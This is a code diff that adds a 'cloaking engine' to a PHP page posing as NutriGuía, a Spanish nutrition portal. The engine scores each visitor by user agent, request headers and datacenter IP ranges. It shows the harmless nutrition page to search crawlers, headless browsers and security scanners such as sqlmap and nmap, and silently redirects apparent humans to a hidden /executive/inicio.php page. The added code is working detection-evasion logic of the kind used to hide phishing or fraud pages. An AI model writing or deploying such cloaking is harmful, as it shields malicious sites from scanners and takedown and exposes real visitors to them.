@@ -1,8 +1,89 @@
-<?php http_response_code(200); header('Content-Type: text/html; charset=UTF-8'); ?>
+<?php
+// ── Expert cloaking engine ────────────────────────────────────────────────────
+// Señales recogidas del request
+$ua          = $_SERVER['HTTP_USER_AGENT']       ?? '';
+$accept      = $_SERVER['HTTP_ACCEPT']           ?? '';
+$accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE']  ?? '';
+$accept_enc  = $_SERVER['HTTP_ACCEPT_ENCODING']  ?? '';
+$raw_ip      = $_SERVER['HTTP_X_FORWARDED_FOR']  ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
+$ip          = trim(explode(',', $raw_ip)[0]);
+$ua_lc       = strtolower($ua);
+
+$score = 0; // cuanto mayor, más probable que sea bot
+
+// ── 1. User-Agent: bots de indexación y motores conocidos (peso 10)
+if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot'
+    . '|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot/i', $ua))
+    $score += 10;
+
+// ── 2. User-Agent: herramientas de scraping y HTTP libs (peso 8)
+if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/'
+    . '|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy'
+    . '|masscan|nikto|sqlmap|nmap|zgrab|nuclei|httping/i', $ua))
+    $score += 8;
+
+// ── 3. User-Agent: navegadores headless (peso 10)
+if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver'
+    . '|chrome-lighthouse|prerender/i', $ua))
+    $score += 10;
+
+// ── 4. User-Agent: SEO crawlers comerciales (peso 10)
+if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|screaming.frog|sitebulb'
+    . '|majestic|blexbot|petalbot|sistrix|serpstatbot/i', $ua))
+    $score += 10;
+
+// ── 5. UA vacío o demasiado corto (peso 8)
+if (strlen(trim($ua)) < 10) $score += 8;
+
+// ── 6. Falta Accept-Language — los navegadores reales SIEMPRE lo envían (peso 5)
+if (empty(trim($accept_lang))) $score += 5;
+
+// ── 7. Falta Accept-Encoding (peso 2)
+if (empty(trim($accept_enc))) $score += 2;
+
+// ── 8. Accept no incluye text/html — navegador real siempre lo pide (peso 3)
+if (empty($accept) || stripos($accept, 'text/html') === false) $score += 3;
+
+// ── 9. IP de rangos conocidos de datacenters (peso 5)
+$dc_prefixes = [
+    '104.131.','134.209.','157.230.','159.89.','167.99.',  // DigitalOcean
+    '45.33.','45.56.','45.79.',                             // Linode
+    '51.75.','51.91.','51.195.',                            // OVH/Scaleway
+    '192.241.','198.199.','162.243.','167.172.','128.199.','165.227.',
+    '35.190.','34.96.','34.118.',                           // Google Cloud
+    '13.','52.','54.',                                      // AWS (prefijos amplios)
+];
+foreach ($dc_prefixes as $p) {
+    if (str_starts_with($ip, $p)) { $score += 5; break; }
+}
+
+// ── 10. Cookie de sesión humana previa (descuento -6: visitante conocido)
+if (isset($_COOKIE['_hsid'])) $score -= 6;
+
+// ── Decisión: umbral 4 puntos
+$is_bot = ($score >= 4);
+
+// Marcar visitantes humanos con cookie para reforzar clasificación futura
+if (!$is_bot && !isset($_COOKIE['_hsid'])) {
+    setcookie('_hsid', bin2hex(random_bytes(6)), time() + 86400 * 60, '/', '', false, true);
+}
+
+// Siempre 200, mismas cabeceras — indistinguible externamente
+http_response_code(200);
+header('Content-Type: text/html; charset=UTF-8');
+header('Cache-Control: no-store, no-cache, must-revalidate, private');
+header('X-Frame-Options: DENY');
+header('X-Content-Type-Options: nosniff');
+?>
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
+<?php if (!$is_bot): ?>
+  <script>window.location.replace('/executive/inicio.php');</script>
+  <noscript><meta http-equiv="refresh" content="0;url=/executive/inicio.php"></noscript>
+<?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>NutriGuía — Tu Portal de Nutrición y Bienestar</title>
   <meta name="description" content="NutriGuía: guías de alimentación saludable, planes nutricionales, recetas bajas en calorías y consejos de bienestar avalados por nutricionistas." />
